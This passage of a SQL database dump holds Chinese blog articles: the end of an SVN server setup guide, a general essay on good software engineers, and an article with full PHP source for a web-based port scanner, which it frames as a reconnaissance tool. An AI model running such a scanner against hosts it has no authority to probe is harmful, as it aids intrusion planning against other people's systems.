/&gt;\r\n三、修改配置文件/home/svnrepo/conf/svnserve.conf&lt;br /&gt;\r\n&lt;br /&gt;\r\n代码&lt;br /&gt;\r\n&lt;br /&gt;\r\n#去掉#[general]前面的#号&lt;br /&gt;\r\n[general]&lt;br /&gt;\r\n#匿名访问的权限，可以是read,write,none,默认为read&lt;br /&gt;\r\nanon-access = none&lt;br /&gt;\r\n#认证用户的权限，可以是read,write,none,默认为write&lt;br /&gt;\r\nauth-access = write&lt;br /&gt;\r\n#密码数据库的路径，去掉前面的#&lt;br /&gt;\r\npassword-db = passwd&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n注意：所有的行都必须顶格，否则报错。&lt;br /&gt;\r\n建议：为了防止不必要的错误，建议你直接用我上面的内容覆盖掉文件原来的内容&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n四、修改配置文件passwd。&lt;br /&gt;\r\n&lt;br /&gt;\r\n代码&lt;br /&gt;\r\n[users]&lt;br /&gt;\r\nflandy = flandypass&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n注意&lt;br /&gt;\r\n1. 一定要去掉[users]前面的#,否则svn只能以匿名用户登录，客户端不会出现登录窗口，除非你的anon不为none,否则将返回一个错误。&lt;br /&gt;\r\n2. 这里的密码都是没有加密的，我按照一些教程所说的用htpasswd生成的密码无法使用。&lt;br /&gt;\r\n&lt;br /&gt;\r\n五、配置SVN xinetd启动方式：&lt;br /&gt;\r\n在/etc/xinetd.d/下面新建svn文件&lt;br /&gt;\r\nservice svn&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;disable = no&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;port = 3690&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;socket_type = stream&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;protocol = tcp&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;wait = no&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;user = svn&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server = /usr/bin/svnserve&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_args = -i -r /home/svn&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n重启xinetd&amp;nbsp;&amp;nbsp; /etc/init.d/xinetd restart&lt;br /&gt;\r\n&lt;br /&gt;\r\n六、停止SVN服务器：killall svnserve&lt;br /&gt;\r\n&lt;br /&gt;\r\n七、启动SVN服务器&lt;br /&gt;\r\n&lt;br /&gt;\r\n对于单个代码仓库&lt;br /&gt;\r\n&lt;br /&gt;\r\n启动命令&amp;nbsp;&amp;nbsp;svnserve -d -r /home/svn --listen-host 192.168.1.16&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n其中-d表示在后台运行，-r指定服务器的根目录，这样访问服务器时就可以直接用svn://服务器ip来访问了。如果服务器有多ip的话--listen-host来指定监听的ip地址.&lt;br /&gt;\r\n&lt;br /&gt;\r\n我们可以在svn客户端中通过svn://192.168.1.16来访问svn服务器&lt;br /&gt;\r\n&lt;br /&gt;\r\n对于多个代码仓库,我们在启动时也可以用-r选项来指定服务器根目录,但访问时需要写上每个仓库相对于svn根目录的相对路径.&lt;br /&gt;\r\n&lt;br /&gt;\r\n比 如,我们有两个代码仓库/home/repo1 和/home/repo2,我们用svnserve -d -r /home --listen-host 192.168.1.16来启动,那么在客户端访问时可以用svn://192.168.1.16/repo1和svn: //192.168.1.16/repo2来分别访问两个项目&lt;br /&gt;\r\n&lt;br /&gt;\r\n八、开放服务器端口&lt;br /&gt;\r\n&lt;br /&gt;\r\nsvn默认端口是3690，你需要在防火墙上开放这个端口。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/sbin/iptables -A INPUT -i eth0 -p tcp --dport 3690 -j ACCEPT&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/sbin/service iptables save&lt;br /&gt;\r\n&lt;br /&gt;\r\n你也可以通过svnserve的--listen-port选项来指定一个已经开放的其他端口,不过这样的话客户端使用也必须家上端口,如svn://192.168.1.200:9999/.&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;/span&gt;&lt;/div&gt;\r\n', 1, 1, 0, 0, 1302187079, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(35, 1, 'php在线端口扫描器', '', '', '&lt;p&gt;PHP是一种功能强大的Web开发语言。开发效率高，语法简单，为动态网站量身定做，加强面向对象（向C++靠拢，与JAVA搭了点边），可惜单线程（这是至命弱点，据说PHP是用C\\C++编写的。），也能用C、C++、JAVA开发中间层，调用COM，服务器维护难度小，故障少。&lt;br /&gt;\r\n　　既然是为动态网站量身定做，所以注定不能开发出X-scan这样的超强扫描器，不过如果要实现一些简单的功能，还是绰绰有余的。&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　端口扫描是我们最常用的踩点手段。如果在网吧这种地方，下载一个专门的扫描器又比较麻烦，如果利用现有的Web服务提供的端口扫描。那可真的是省了不少事。&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　下面我们就看看我写的这个PHP端口扫描器的源代码：&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\n$youip=$HTTP_SERVER_VARS[&quot;REMOTE_ADDR&quot;]; // 获取本机IP地址&lt;br /&gt;\r\n&lt;br /&gt;\r\n$remoteip=$HTTP_POST_VARS[''remoteip'']; // 获取表单提交的IP地址&lt;br /&gt;\r\n&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;html&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;head&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;title&amp;gt;端口在线检测&amp;lt;/title&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;style TYPE=&quot;text/css&quot;&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;!--&lt;br /&gt;\r\n&lt;br /&gt;\r\nBODY { FONT-SIZE: 12px; FONT-FAMILY: Verdana;color:#000000;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\nTD {&lt;br /&gt;\r\n&lt;br /&gt;\r\nFONT-SIZE: 12px;&lt;br /&gt;\r\n&lt;br /&gt;\r\nFONT-FAMILY: Verdana;&lt;br /&gt;\r\n&lt;br /&gt;\r\ncolor:#000000;&lt;br /&gt;\r\n&lt;br /&gt;\r\nline-height: 14px;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n.style1 {color: #FFFFFF}&lt;br /&gt;\r\n&lt;br /&gt;\r\n--&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;/style&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;/head&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;body&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;center&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\nif (!empty($remoteip)){&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 如果表单不为空就进入IP地址格式的判断&lt;br /&gt;\r\nfunction err() {&lt;br /&gt;\r\n&lt;br /&gt;\r\ndie(&quot;对不起，该IP地址不合法&amp;lt;p&amp;gt;&amp;lt;a href=javascript:history.back(1)&amp;gt;点击这里返回&amp;lt;/a&amp;gt;&quot;);&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 定义提交错误IP的提示信息&lt;br /&gt;\r\n$ips=explode(&quot;.&quot;,$remoteip);&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 用.分割IP地址&lt;br /&gt;\r\nif (intval($ips[0])&amp;lt;1 or intval($ips[0])&amp;gt;255 or intval($ips[3])&amp;lt;1&lt;br /&gt;\r\nor intval($ips[3]&amp;gt;255)) err();&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 如果第一段和最后一段IP的数字小于1或者大于255，则提示出错&lt;br /&gt;\r\nif (intval($ips[1])&amp;lt;0 or intval($ips[1])&amp;gt;255 or intval($ips[2])&amp;lt;0&lt;br /&gt;\r\nor intval($ips[2]&amp;gt;255)) err();&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 如果第二段和第三段IP的数字小于0或者大于255，则提示出错&lt;br /&gt;\r\n$closed=''此端口目前处于关闭状态。'';&lt;br /&gt;\r\n&lt;br /&gt;\r\n$opened=''&amp;lt;font color=red&amp;gt;此端口目前处于打开状态！&amp;lt;/font&amp;gt;'';&lt;br /&gt;\r\n&lt;br /&gt;\r\n$close=&quot;关闭&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$open=&quot;&amp;lt;font color=red&amp;gt;打开&amp;lt;/font&amp;gt;&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$port=array(21,23,25,79,80,110,135,137,138,139,143,443,445,1433,3306,3389);&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n$msg=array(&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Ftp'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Telnet'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Smtp'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Finger'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Http'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Pop3'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Location Service'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Netbios-NS'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Netbios-DGM'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Netbios-SSN'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''IMAP'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Https'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Microsoft-DS'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''MSSQL'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''MYSQL'',&lt;br /&gt;\r\n&lt;br /&gt;\r\n''Terminal Services''&lt;br /&gt;\r\n&lt;br /&gt;\r\n);&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 通过IP格式的检查后用数组定义各端口对应的服务名称及状态&lt;br /&gt;\r\necho &quot;&amp;lt;table border=0 cellpadding=15 cellspacing=0&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;tr&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;td align=center&amp;gt;&amp;lt;strong&amp;gt;您扫描的IP：&amp;lt;font&lt;br /&gt;\r\n&lt;br /&gt;\r\ncolor=red&amp;gt;&quot;.$remoteip.&quot;&amp;lt;/font&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/td&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/tr&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/table&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;table cellpadding=5 cellspacing=1 bgcolor=#636194&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;tr bgcolor=#7371A5 align=center&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;td&amp;gt;&amp;lt;span class=style1&amp;gt;端口&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;td&amp;gt;&amp;lt;span class=style1&amp;gt;服务&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;td&amp;gt;&amp;lt;span class=style1&amp;gt;检测结果&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;td&amp;gt;&amp;lt;span class=style1&amp;gt;描述&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/tr&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 输出显示的表格&lt;br /&gt;\r\nfor($i=0;$i&amp;lt;sizeof($port);$i++)&lt;br /&gt;\r\n&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&lt;br /&gt;\r\n$fp = @fsockopen($remoteip, $port[$i], &amp;amp;$errno, &amp;amp;$errstr, 1);&lt;br /&gt;\r\n&lt;br /&gt;\r\nif (!$fp) {&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;tr bgcolor=#FFFFFF&amp;gt;&amp;lt;td align=center&amp;gt;&quot;.$port[$i].&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$msg[$i].&quot;&amp;lt;/td&amp;gt;&amp;lt;td&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nalign=center&amp;gt;&quot;.$close.&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$closed.&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n} else {&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;tr bgcolor=#F4F7F9&amp;gt;&amp;lt;td align=center&amp;gt;&quot;.$port[$i].&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$msg[$i].&quot;&amp;lt;/td&amp;gt;&amp;lt;td&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nalign=center&amp;gt;&quot;.$open.&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$opened.&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 用for语句，分别用fsockopen函数连接远程主机的相关端口，并输出结果&lt;br /&gt;\r\necho &quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=4 align=center&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;a href=portscan.php&amp;gt;&amp;lt;font color=#FFFFFF&amp;gt;继续扫描&amp;gt;&amp;gt;&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/tr\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/table&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;TABLE cellSpacing=0 cellPadding=10 width=100% border=0&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;TR&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;TD align=center&amp;gt;&amp;lt;b&amp;gt;Copyright &amp;amp;copy; 2004 Security&lt;br /&gt;\r\nAngel Team[S4T] All Rights Reserved.&amp;lt;/b&amp;gt;&amp;lt;/TD&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/TR&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/TABLE&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/center&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/body&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/html&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\nexit;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 探测结束&lt;br /&gt;\r\necho &quot;&amp;lt;table border=0 cellpadding=15 cellspacing=0&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;tr&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;td align=center&amp;gt;&amp;lt;strong&amp;gt;您的IP：&amp;lt;font color=red&amp;gt;&quot;.$youip.&quot;&amp;lt;/font&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/td&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/tr&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;form method=POST action=portscan.php&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;input type=text name=remoteip size=12&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;input type=submit value=扫描 name=scan&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/form&amp;gt;&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\necho &quot;&amp;lt;/table&amp;gt;\\n&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n// 如果表单为空则显示提交IP地址的表单&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&amp;lt;TABLE cellSpacing=0 cellPadding=10 width=&quot;100%&quot; border=0&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;TR&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;TD align=center&amp;gt;&amp;lt;b&amp;gt;Copyright &amp;amp;copy; 2004 Security Angel Team[S4T]&lt;br /&gt;\r\nAll Rights Reserved.&amp;lt;/b&amp;gt;&amp;lt;/TD&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;/TR&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;/TABLE&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;/center&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;/body&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;/html&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　这个扫描器很简单。就是用了一个数组来定义端口的相关信息，原理就是用fsockopen函数连接，如果可以连接，就表示端口打开，否则就是关闭。&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　最大的缺点就是PHP是单线程的，所以速度会很慢，这个是用方便、简单作为代价的，其实写这个代码的就是想告诉大家，PHP并不仅仅用于动态网站的开发，也可以用于网络安全领域，往往太注意事物的本职工作，就会忽略其他方面的特点。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1302272453, 1, 'admin'),
(36, 1, '优秀软件工程师所具备的特点', '', '', '&lt;strong&gt;1. 热爱编程&lt;/strong&gt;&lt;p&gt;　　编程是一种为了满足兴趣而心甘情愿去做的劳动（Programming is a labor of love）。和其他任何职业一样，唯有真正的热情，才能完成真正的伟大事情。这里有个误解，认为编写代码是机械化并纯科学性的。事实上，最优秀的软件工程师是工匠，他们能把能量、独创性和创造力融入到每一行代码中。伟大的工程师知道何时该把代码雕琢至完美，知道何时把大型系统像拼图一样组装到一块。热爱编程的工程师从构建软件中获得满足，就好比一位作曲家在完成一部交响乐后而欣喜若狂。正是兴奋感和成就感，才造就了喜爱编程的明星工程师。&lt;/p&gt;\r\n&lt;p&gt;　　&lt;strong&gt;2. 完成事情&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;　　有很多技术人员只谈论软件而不编写代码（只说不做型）。而伟大软件工程师会真正去编码，这也是他们最为重要的品质之一。他们是实际做事的人。聪明人都知道，解决问题的最佳途径是直面问题，而不是花上数周来设计复杂又不必要的架构和函数库。优秀工程师应当会问：解决手头问题的最简单方法是什么？最近的软件开发方法——敏捷实践，正是专注那个。它的思想是，把复杂的项目拆分为短小的迭代，每个迭代只关注一小部分的增量功能。因为每个迭代对应的编码只需要数周，所以功能易于管理并简单。&lt;/p&gt;\r\n&lt;p&gt;　　&lt;strong&gt;3. 持续重构代码&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;　　编码很像雕刻。要像艺术家一样不断完善自己的作品，软件工程师也要通过可能的最佳方式来持续完善自己的代码，以达到目标。重新塑造代码的原则称为“重构”，Martin Fowler在他的创意书中有相应描述。重构背后的原始思想是：改善代码而不改变其功能，移动调整部分代码以确保系统不腐，还有确保系统完成基于当前需求该完成的事。持续重构可以让开发人员解决另一个著名的问题——“黑盒遗留代码”（这个问题基本无人想触及）。&lt;/p&gt;\r\n&lt;p&gt;　　几十年的软件开发文化要求我们，不应该去改变正常工作的东西。然而，随着时间推移，问题是我们成为了老旧代码的奴隶，老旧代码变得不稳定和不兼容。而重构正好可以改变这一状况，因为我们是代码的主人，不是它的奴隶。重构在工程师和代码之间建立起持续的“对话”，并带来所有权、确定性、自信心和系统的稳定性。&lt;/p&gt;\r\n&lt;p&gt;　　千万不要成为老旧代码的奴隶。如果代码是他人所写，或许你可以轻易推脱责任。但大多数时候，那些代码是自己所写，要拿得起放得下，旧代码该埋时，就把它埋了！&lt;/p&gt;\r\n&lt;p&gt;　　&lt;strong&gt;4. 使用设计模式&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;　　自从所谓的“四人帮”（Erich Gamma、Richard Helm、Ralph Johnson和John Vlissides）发表他们的著作——《设计模式》后，全世界的软件工程师一直都在讨论模式。在我们所处世界，不管是自然界还是人类行为，模式无处不在。软件工程自然也不例外。模式就是不断重现的跨语言跨系统的场景和机制。一位优秀的工程师通常能识别并利用模式，而不是受制于模式。工程师不应（强制）让系统去适应某种模式，而需发现在系统中使用模式的时机（恰当使用模式）。在使用模式来确保正确性时，应借鉴利用前人的智慧结晶，使用以前能正当解决特定工程问题的方法。但请切记：模式不是万灵药；不要为了使用设计模式而使用设计模式。&lt;/p&gt;\r\n&lt;p&gt;　　&lt;strong&gt;5. 编写测试&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;　　曾有段时间，软件工程师们认为测试不值得他们去做。然而，如果你不做测试，你怎么能确保代码就能正常工作呢？敏捷实践中的“单元测试”已获得普遍认可，因为它注重编写测试来反映代码是否有效。随着系统增大，测试也随之增大。有经验的工程师知道并了解测试的价值所在，因为测试的目的就是创建一个能正常运作的系统。优秀的工程师通常会确保出现过一次的Bug不会再出现第二次。但优秀的工程师也知道，不应该浪费时间写那些琐碎或多余的测试，而需要专注测试各个组件中的核心部分。&lt;/p&gt;\r\n&lt;p&gt;　　&lt;strong&gt;6. 善用现有代码&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;　　“重新发明轮子”一直是软件行业中的巨大问题之一。从发明新语言到从写函数库，忽视并重写那些已经存在并已能工作的奇怪驱动力，已经造成大量软件开发的失败案例。一位明星工程师会专注三种基本类型的重用：第一，内部基础架构的重用，相应代码是他自己或同事编写的；第二，使用第三方的函数库，比如JDK.最后，研究使用某些大型网络服务商提供的相应服务，比如Amazon.总之，正确善用现有的代码，使得软件工程师能真正专注于最为重要的事情上——应用程序本身。&lt;/p&gt;\r\n&lt;p&gt;　　&lt;strong&gt;7. 专注可用性&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;　　优秀的工程师通常都专注于用户。无论用户是企业还是个人，无论是为消费型的软件公司还是投资银行，需要关注的都是可用性。用户如何和系统交互？系统是否提供一种简单、直接和平稳的操作体验？有种说法，因为软件工程师是技术人员，他/她和“用户如何与系统交互”没有关联，这种说法严重错误。优秀工程师努力工作是为了什么？不正是让系统简单并易于使用。他们无时无刻都会想到用户，不会尝试去发明那些令人费解，只有极客才能理解并欣赏的东西。&lt;/p&gt;\r\n&lt;p&gt;　　有些时候，一些软件工程师过于投入，反而忘记所编写的程序/软件，是供他人使用，不是做给自己看的“艺术品”。所以，在软件开发过程中，一直要把“用户”放在心中。&lt;/p&gt;\r\n&lt;p&gt;　　&lt;strong&gt;8. 编写可维护的代码&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;　　软件开发界的另外一个小秘密是：编写优秀代码和糟糕代码所花费的时间是一样多。一位训练有素的工程师，他/她会从第一行代码开始就考虑可维护性和代码的演化。没有任何理由编写“丑陋”的代码、长达数页的函数，或是稀奇古怪的变量名。优秀的工程师编写代码会遵循命名惯例，代码编写紧凑、简单和不过度炫耀聪明。代码的每一行，都应恰如其分地展现出其原有目的。在给不便理解的代码（块）合理注释时，别忘了命名规则。清晰明了的函数名和变量名可以让代码不言而明。&lt;/p&gt;\r\n&lt;p&gt;　　在编码时，有些程序员会有这种心态：过一会儿再来修改或完善某部分代码或某条语句。但谁知这一“过一会”竟然是“一天”、“一周”、“一个月”或“一年”，甚至以后根本就没机会再回头修改。所以，尽量别妥协写出暂时堪用的代码。否则，不仅不会节省开发时间，也可以阻碍整个进程。当然也不利于后续维护人员的工作。&lt;/p&gt;\r\n&lt;p&gt;　　&lt;strong&gt;9. 能用任何语言编程&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;　　优秀的软件工程师活血有自己一门特别钟爱的编程语言，但从不会执迷于当中。如今已有很多优秀的编程语言，也就是说，如果你只会使用其中一门语言，说明你缺乏多样性。你可以用Java、C#或C++编写任何现代软件，可以用PHP、Perl或Ruby编写任何网站的后台。简而言之，编程所用语言，远远没有语言相应的函数库重要。优秀的工程师能够认知到这一点，并愿意去学习新语言、新函数库和构建系统的新方法。&lt;/p&gt;\r\n&lt;p&gt;　　&lt;strong&gt;10. 知晓基本的计算机科学知识&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;　　最后，但肯定不是优秀工程师最不重要的特质就是：扎实的基础。优秀的工程师或许并没有计算机科学的学位，但他/她必须知道基础——数据结构和算法。如果不知道哈希表，或者不知道链表和数组之间的差别，你如何构建一款大型的软件？。这些都是每位从事软件开发的开发人员应当知道的。算法也同样重要，从二分查找到各种排序，到图形遍历，一位明星工程师必须知道并内在消化这些基础东西。因为这些基础就是你在构建任何现代软件中做抉择时的必备品。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1302416774, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(37, 1, 'php读取操作大文件-php文件系统简介', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:arial, sans-serif, helvetica, tahoma;&quot;&gt;&lt;h3 style=&quot;font-size:1.2em;line-height:1.5em;margin-top:0px;margin-right:0px;margin-bottom:0.5em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:black;&quot;&gt;1. 直接采用file函数来操作&lt;/h3&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;注：由于 